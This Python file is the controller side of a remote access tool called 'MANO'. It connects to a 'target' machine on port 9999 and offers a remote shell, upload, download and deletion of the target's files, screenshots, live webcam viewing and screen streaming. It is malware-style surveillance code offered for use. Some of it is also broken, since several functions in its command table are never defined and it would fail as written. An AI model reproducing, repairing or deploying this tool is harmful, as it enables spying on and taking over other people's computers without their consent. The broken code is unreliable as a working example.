#copyright © 2019-2024 manoharkakumani

import socket
import sys
import os
import time
import shutil
import cv2
import pickle
import struct
import numpy as np

# Display banner
def display_banner():
    print("*******************************************************")
    print("""
 __  __    _    _   _  ___   __   
|  \/  |  / \  | \ | |/ _ \  \ \  
| |\/| | / _ \ |  \| | | | |  \ \ 
| |  | |/ ___ \| |\  | |_| |  / / 
|_|  |_/_/   \_\_| \_|\___/  /_/
copyright © 2019-2024 manoharkakumani""")
    print("\n******************************************************")

# Create and connect socket
def create_and_connect_socket():
    try:
        s = socket.socket()
        host = input('Enter Target IP or q or Q to exit :')
        if host.lower() == 'q':
            sys.exit(0)
        port = 9999
        s.connect((host, port))
        return (host, s)
    except Exception as e:
        print("Error in binding: ", e)
        return create_and_connect_socket()

# Delete menu
def display_delete_menu(context):
    print("----------------------------------------------------------------------------")
    print(f"1. Delete file \n2. Delete Dir/Folder \n3. Change {context} Dir \n4. File list \n5. Exit \n")
    print("----------------------------------------------------------------------------")

# Loading animation
def loading_animation():
    for progress in range(100, -1, -1):
        sys.stdout.write("\r|" + "█" * (progress // 2) + "|{0:.2f}%".format(progress))
        sys.stdout.flush()
        time.sleep(0.01)

# Delete files or folders in client directory
def delete_client_files_or_folders(conn):
    try:
        display_delete_menu("client's")
        choice = int(input("Your Choice: "))
        if choice == 1:
            filename = input("Enter file name with extension: ")
            conn.send(('fdel~' + filename).encode("utf-8"))
            loading_animation()
        elif choice == 2:
            dirname = input("Enter folder name: ")
            conn.send(('fdel~' + dirname).encode("utf-8"))
            loading_animation()
        elif choice == 3:
            change_client_directory(conn)
            delete_client_files_or_folders(conn)
        elif choice == 4:
            list_client_files(conn)
            delete_client_files_or_folders(conn)
        elif choice == 5:
            return False
        else:
            print("\nWrong Choice!")
            delete_client_files_or_folders(conn)
        return True
    except Exception as e:
        print(e)

# Change the working directory
def change_directory():
    try:
        print("Your current working dir: " + os.getcwd())
        choice = input("Do you want to change (Y/N)? : ").upper()
        if choice == 'Y':
            new_dir = input("Enter your DIR to change: ")
            os.chdir(new_dir)
            print("New working directory: " + os.getcwd())
        else:
            return
    except Exception as e:
        print(e)

# Change client's working directory
def change_client_directory(conn):
    try:
        conn.send(('cdir~s').encode("utf-8"))
        print("Client's current working dir: " + conn.recv(1024).decode("utf-8"))
        choice = input("Do you want to change (Y/N)? : ").upper()
        conn.send(str(choice).encode("utf-8"))
        if choice == 'Y':
            new_dir = input("Enter new directory: ")
            conn.send(new_dir.encode("utf-8"))
            print("Client's new working dir: " + conn.recv(1024).decode("utf-8"))
        else:
            return
    except Exception as e:
        print(e)

# List files in current directory
def list_files():
    print("Files in current directory:")
    for file in os.listdir():
        print(file)

# List client's files
def list_client_files(conn):
    try:
        conn.send(('flist~s').encode("utf-8"))
        print("Client's files:")
        files = pickle.loads(conn.recv(1024))
        for file in files:
            print(file)
    except Exception as e:
        print(e)

# Upload file to client
def upload_file_to_client(conn):
    try:
        filename = input("Filename to upload: ")
        if os.path.isfile(filename):
            conn.send(str("fup~" + filename).encode("utf-8"))
            conn.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
            filesize = int(os.path.getsize(filename))
            user_response = conn.recv(1024).decode("utf-8")
            if user_response[:2] == 'OK':
                with open(filename, 'rb') as f:
                    bytes_to_send = f.read(1024)
                    conn.send(bytes_to_send)
                    total_sent = len(bytes_to_send)
                    while total_sent < filesize:
                        bytes_to_send = f.read(1024)
                        total_sent += len(bytes_to_send)
                        conn.send(bytes_to_send)
                        sys.stdout.write("\rUploaded: {0:.2f}%".format((total_sent / filesize) * 100))
                        sys.stdout.flush()
                    print("\nUpload Completed!")
        else:
            print("File does not exist.")
    except Exception as e:
        print(e)

# Download file from client
def download_file_from_client(conn):
    try:
        filename = input("Filename to download: ")
        if filename != 'q':
            conn.send(("fdown~" + filename).encode("utf-8"))
            data = conn.recv(1024).decode("utf-8")
            if data[:6] == 'EXISTS':
                filesize = int(data[6:])
                msg = input(f"File exists, {filesize} Bytes, download? (Y/N)? -> ").upper()
                if msg == 'Y':
                    conn.send("OK".encode("utf-8"))
                    with open(filename, 'wb') as f:
                        data = conn.recv(1024)
                        total_received = len(data)
                        f.write(data)
                        while total_received < filesize:
                            data = conn.recv(1024)
                            total_received += len(data)
                            f.write(data)
                            sys.stdout.write("\rDownloaded: {0:.2f}%".format((total_received / filesize) * 100))
                            sys.stdout.flush()
                            time.sleep(0.01)
                        print("\nDownload Complete!")
            else:
                print("File does not exist.")
    except Exception as e:
        print(e)
    # Take screenshot from the client
def take_screenshot_from_client(conn):
    try:
        filename = input('Enter Screenshot name to save: ') + ".jpg"
        data = conn.recv(1024).decode("utf-8")
        if data[:6] == 'EXISTS':
            filesize = int(data[6:])
            conn.send("OK".encode("utf-8"))
            with open(filename, 'wb') as f:
                data = conn.recv(1024)
                total_received = len(data)
                f.write(data)
                while total_received < filesize:
                    data = conn.recv(1024)
                    total_received += len(data)
                    f.write(data)
            print("Screenshot saved as", filename)
        else:
            print("Failed to take screenshot!")
    except Exception as e:
        print(e)

# Access client's camera
def access_client_camera(conn):
    try:
        response = conn.recv(1024).decode("utf-8")
        if response == "OK":
            while True:
                conn.send("cam".encode('utf-8'))
                data = b""
                img_size = struct.calcsize(">L")
                while len(data) < img_size:
                    data += conn.recv(4096)
                img_size = struct.unpack(">L", data[:img_size])[0]
                data = data[img_size:]
                while len(data) < img_size:
                    data += conn.recv(4096)
                frame_data = data[:img_size]
                data = data[img_size:]
                frame = pickle.loads(frame_data, fix_imports=True, encoding="bytes")
                frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
                cv2.imshow('Client Camera', frame)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break
            cv2.destroyAllWindows()
        else:
            print("Camera access failed: ", response)
    except Exception as e:
        print(e)

# Stream client's screen
def stream_client_screen(conn):
    try:
        response = conn.recv(1024).decode("utf-8")
        if response == "OK":
            while True:
                conn.send("sst".encode('utf-8'))
                data = b""
                screen_size = struct.calcsize(">L")
                while len(data) < screen_size:
                    data += conn.recv(4096)
                screen_size = struct.unpack(">L", data[:screen_size])[0]
                data = data[screen_size:]
                while len(data) < screen_size:
                    data += conn.recv(4096)
                frame_data = data[:screen_size]
                data = data[screen_size:]
                frame = pickle.loads(frame_data, fix_imports=True, encoding="bytes")
                frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
                cv2.imshow('Client Screen', frame)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break
            cv2.destroyAllWindows()
        else:
            print("Screen streaming failed: ", response)
    except Exception as e:
        print(e)

# Main command interface
def command_interface(host_ip, conn):
    while True:
        command = input(f"MANO >> {host_ip} >> ")
        if command in command_actions:
            command_actions[command](conn)
        elif command == 'back':
            conn.send(('back~s').encode("utf-8"))
            return
        elif command == 'exit':
            conn.send(('exit~s').encode("utf-8"))
            return
        elif command == 'help':
            display_help()
        else:
            print("Command not recognized")

# Command actions dictionary
command_actions = {
    'shell': send_shell_commands,
    'fdown': download_file_from_client,
    'fup': upload_file_to_client,
    'fl': list_files,
    'cfl': list_client_files,
    'cd': change_directory,
    'ccd': change_client_directory,
    'cdel': delete_client_files_or_folders,
    'fdel': delete_files_or_folders,
    'pwd': lambda: print("Your current directory: " + os.getcwd()),
    'cwd': get_client_working_directory,
    'sshot': take_screenshot_from_client,
    'cam': access_client_camera,
    'sst': stream_client_screen
}

# Display help
def display_help():
    print("""
    shell   --> Open shell on the target\n
    fdown   --> Download files from the target\n
    fup     --> Upload files to the target\n
    fl      --> List files in your current directory\n
    cfl     --> List files in target's current directory\n
    cd      --> Change your current directory\n
    ccd     --> Change target's current directory\n
    fdel    --> Delete file in your current directory\n
    cdel    --> Delete file in target's current directory\n
    pwd     --> Get your current directory\n
    cwd     --> Get target's current directory\n
    sshot   --> Take screenshot of target's screen\n
    cam     --> Access target's camera\n
    sst     --> Stream target's screen\n
    back    --> Back to main menu\n
    exit    --> Exit\n
    """)

# Get client's working directory
def get_client_working_directory(conn):
    conn.send(('cwd~s').encode("utf-8"))
    print("Client's current working directory: " + conn.recv(1024).decode("utf-8"))

# Main program execution
if __name__ == "__main__":
    display_banner()
    while True:
        host, socket_conn = create_and_connect_socket()
        command_interface(host, socket_conn)

